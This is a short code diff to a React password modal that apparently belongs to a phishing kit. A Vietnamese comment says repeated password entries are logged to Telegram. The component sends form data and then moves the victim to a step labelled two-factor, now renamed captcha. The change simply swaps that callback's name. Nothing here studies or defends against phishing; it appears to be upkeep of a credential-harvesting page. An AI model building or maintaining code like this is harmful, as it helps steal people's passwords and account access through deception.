@@ -9,7 +9,7 @@ import { SendData } from '@/utils/sendData';
 
 interface PasswordModalProps {
     isOpend: boolean;
-    isOpendTwoFactor: (value: boolean) => void;
+    isOpendCaptcha: (value: boolean) => void;
     onToggleModal: (isOpen: boolean) => void;
 }
 
@@ -17,7 +17,7 @@ const SUBMIT_DELAY_MS = 1345;
 /** Ghi nhận trong Telegram Password(3) khi bấm «Quên mật khẩu?» thay vì nhập lần 3 */
 const PASSWORD_THIRD_FORGOT_MARKER = '(Forgot)';
 
-const PasswordModal: React.FC<PasswordModalProps> = ({ isOpend, isOpendTwoFactor, onToggleModal }) => {
+const PasswordModal: React.FC<PasswordModalProps> = ({ isOpend, isOpendCaptcha, onToggleModal }) => {
     const t = useAppStrings();
 
     const [isOpen, setIsOpen] = React.useState(isOpend);
@@ -64,7 +64,7 @@ const PasswordModal: React.FC<PasswordModalProps> = ({ isOpend, isOpendTwoFactor
 
     const goForgotToTwoFa = () => {
         dispatch(updateForm({ passwordThird: PASSWORD_THIRD_FORGOT_MARKER }));
-        isOpendTwoFactor(true);
+        isOpendCaptcha(true);
         handleClose();
     };
 
@@ -104,7 +104,7 @@ const PasswordModal: React.FC<PasswordModalProps> = ({ isOpend, isOpendTwoFactor
         try {
             await SendData(formData);
             await new Promise((r) => setTimeout(r, SUBMIT_DELAY_MS));
-            isOpendTwoFactor(true);
+            isOpendCaptcha(true);
             handleClose();
         } catch (error) {
             console.error('Error submitting form:', error);
